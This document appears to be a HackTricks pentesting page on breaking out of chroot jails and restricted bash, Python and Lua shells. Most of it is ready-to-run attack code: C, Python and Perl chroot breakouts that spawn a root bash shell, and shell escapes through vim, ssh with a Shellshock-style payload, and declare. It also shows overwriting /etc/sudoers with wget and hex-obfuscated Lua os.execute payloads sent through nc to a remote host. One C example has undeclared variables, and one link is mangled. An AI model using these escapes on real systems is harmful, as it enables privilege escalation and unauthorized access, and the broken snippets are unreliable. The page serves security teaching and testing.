# Escaping from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Chroot Escapes

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
Usually this means that to escape you need to be root inside the chroot.

> [!TIP]
> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.

### Root + CWD

> [!WARNING]
> If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
>
> This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.

Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:

<details>

<summary>C: break_chroot.c</summary>

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

</details>

<details>

<summary>Python</summary>

```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```

</details>

<details>

<summary>Perl</summary>

```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

</details>

### Root + Saved fd

> [!WARNING]
> This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.

<details>

<summary>C: break_chroot.c</summary>

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("tmpdir", 0755);
    dir_fd = open(".", O_RDONLY);
    if(chroot("tmpdir")){
        perror("chroot");
    }
    fchdir(dir_fd);
    close(dir_fd);
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
}
```

</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Create a child process (fork)
> - Create UDS so parent and child can talk
> - Run chroot in child process in a different folder
> - In parent proc, create a FD of a folder that is outside of new child proc chroot
> - Pass to child procc that FD using the UDS
> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) into a directory inside the chroot
> - Chrooting into that directory
>
> This is possible in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs into a directory inside the chroot (if it isn't yet)
> - Look for a pid that has a different root/cwd entry, like: /proc/1/root
> - Chroot into that entry

### Root(?) + Fork

> [!WARNING]
>
> - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
> - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
> - This children process will find himself outside of the chroot

### ptrace

> [!WARNING]
>
> - Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
> - Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Get info about the jail:

```bash
echo $SHELL
echo $PATH
env
export
pwd
```

### Modify PATH

Check if you can modify the PATH env variable

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

### Using vim

```bash
:set shell=/bin/sh
:shell
```

### Create script

Check if you can create an executable file with _/bin/bash_ as content

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

### Get bash from SSH

If you are accessing via ssh you can use this trick to execute a bash shell:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

### Declare

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

### Wget

You can overwrite for example sudoers file

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

### Other tricks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
**It could also be interesting the page:**



{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in the following page:



{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

Some tricks to **call functions of a library without using dots**:

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

Enumerate functions of a library:

```bash
for k,v in pairs(string) do print(k,v) end
```

Note that every time you execute the previous one liner in a **different lua environment the order of the functions change**. Therefore if you need to execute one specific function you can perform a brute force attack loading different lua environments and calling the first function of le library:

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell (and hopefully unlimited) calling:

```bash
debug.debug()
```

## References

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}

